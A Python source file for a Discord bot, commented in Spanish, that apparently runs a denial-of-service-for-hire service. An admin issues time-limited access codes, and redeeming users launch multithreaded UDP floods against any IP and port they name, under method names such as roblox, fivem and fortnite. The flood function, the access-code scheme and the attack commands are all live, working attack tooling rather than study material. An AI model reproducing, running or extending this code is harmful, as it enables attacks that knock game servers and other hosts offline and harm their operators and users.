import discord
from discord.ext import commands, tasks
import asyncio
import threading
import socket
import time
import random
from datetime import datetime, timedelta

TOKEN = 'TU_TOKEN_DISCORD'
INTENTS = discord.Intents.default()
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.members = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070  # Aquí deberías poner el ID de tu cuenta de administrador
valid_codes = {}
user_access = {}

vip_methods = [
    "hudp", "udpbypass", "dnsbypass", "roblox", "fivem",
    "fortnite", "udpraw", "tcproxies", "tcpbypass", "udppps", "samp"
]

# Conversor de tiempo de string a segundos
def parse_time(t):
    if t.endswith("day"):
        return timedelta(days=1)
    elif t.endswith("mes"):
        return timedelta(days=30)
    return None

# Sistema de verificación por código
@bot.command()
async def code(ctx, code: str = None, tiempo: str = None):
    if ctx.author.id != admin_id:
        return await ctx.send("❌ Solo el administrador puede crear códigos.")
    if not code or not tiempo:
        return await ctx.send("Uso: `.code <codigo> <1day/1mes>`")
    delta = parse_time(tiempo)
    if not delta:
        return await ctx.send("Formato inválido. Usa `1day` o `1mes`.")
    valid_codes[code] = datetime.utcnow() + delta
    await ctx.send(f"✅ Código `{code}` creado con duración `{tiempo}`.")

@bot.command()
async def redeem(ctx, code: str = None):
    if not code:
        return await ctx.send("Uso: `.redeem <codigo>`")
    if code not in valid_codes:
        return await ctx.send("❌ Código inválido o ya expirado.")
    expires = valid_codes.pop(code)
    user_access[ctx.author.id] = expires
    await ctx.send(f"✅ Has activado acceso hasta `{expires}` UTC.")

# Verifica si usuario tiene acceso
def has_access(user_id):
    if user_id not in user_access:
        return False
    return datetime.utcnow() < user_access[user_id]

# Payload fuerte (UDP con headers aleatorios)
def build_strong_payload():
    headers = b''.join([
        random._urandom(8),  # source + dest
        random._urandom(4),  # flags + id
        random._urandom(16),  # headers adicionales
    ])
    body = random._urandom(random.randint(1200, 1400))
    return headers + body

# Ataque UDP real fuerte
def strong_udp_bypass(ip, port, duration, stop_event):
    timeout = time.time() + duration
    payload = build_strong_payload()
    
    def flood_thread():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        while time.time() < timeout and not stop_event.is_set():
            try:
                sock.sendto(payload, (ip, port))
                time.sleep(0)  # cede CPU si es necesario
            except:
                continue
        sock.close()

    # Lanzamos múltiples hilos pero controlados
    threads = []
    for _ in range(20):  # 20 hilos potentes
        t = threading.Thread(target=flood_thread)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Comienza un ataque
async def start_attack(ctx, method, ip, port, duration, is_vip=False):
    global global_attack_running

    if not has_access(ctx.author.id):
        return await ctx.send("⛔ No has activado un código. Usa `.redeem <codigo>`.")

    if ip == "127.0.0.1":
        return await ctx.send("❌ No puedes atacar 127.0.0.1.")

    max_time = 300 if is_vip else 60
    if duration > max_time:
        return await ctx.send(f"⚠️ Máximo permitido: {max_time}s")

    if ctx.author.id in active_attacks:
        return await ctx.send("⛔ Ya tienes un ataque activo.")

    if ctx.author.id in cooldowns:
        return await ctx.send("⏳ Espera antes de otro ataque.")

    if global_attack_running:
        return await ctx.send("⚠️ Solo un ataque global a la vez.")

    global_attack_running = True
    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event

    embed = discord.Embed(
        title="🚀 Ataque Iniciado",
        description=f"**Método:** `{method.upper()}`\n**IP:** `{ip}`\n**Puerto:** `{port}`\n**Duración:** `{duration}s`\n**Usuario:** <@{ctx.author.id}>",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

    thread = threading.Thread(target=strong_udp_bypass, args=(ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)
    stop_event.set()
    await ctx.send(f"✅ Ataque finalizado para <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

# Comando !methods
@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="📜 Métodos VIP-BYPASS", color=discord.Color.blue())
    for method in vip_methods:
        embed.add_field(name=f"!{method}", value="(VIP - UDP Potente)", inline=True)
    await ctx.send(embed=embed)

# Crear comandos VIP
def make_vip_command(method):
    @bot.command(name=method)
    async def cmd(ctx, ip: str = None, port: int = None, duration: int = None):
        if not has_access(ctx.author.id):
            return await ctx.send("❌ Solo usuarios con código activado pueden usar este método.")
        await start_attack(ctx, method.upper(), ip, port, duration, is_vip=True)
    return cmd

for method in vip_methods:
    make_vip_command(method)

@bot.command()
async def stop(ctx):
    if ctx.author.id not in active_attacks:
        return await ctx.send("❌ No tienes ataques activos.")
    active_attacks[ctx.author.id].set()
    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global global_attack_running
    global_attack_running = False
    await ctx.send("🛑 Ataque detenido.")
    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stopall(ctx):
    if ctx.author.id != admin_id:
        return await ctx.send("❌ Solo el admin puede detener todos los ataques.")
    for stop_event in active_attacks.values():
        stop_event.set()
    active_attacks.clear()
    global global_attack_running
    global_attack_running = False
    await ctx.send("🛑 Todos los ataques fueron detenidos.")

@bot.command()
async def dhelp(ctx):
    embed = discord.Embed(title="📘 Comandos disponibles", color=discord.Color.gold())
    embed.add_field(name="!stop", value="Detiene tu ataque actual", inline=False)
    embed.add_field(name="!stopall", value="Admin: Detiene todos los ataques", inline=False)
    embed.add_field(name="!methods", value="Lista de métodos", inline=False)
    embed.add_field(name=".code <codigo> <tiempo>", value="Admin: Crear código de acceso", inline=False)
    embed.add_field(name=".redeem <codigo>", value="Reclamar acceso para usar métodos", inline=False)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ Bot activo como {bot.user.name}")

bot.run(TOKEN)
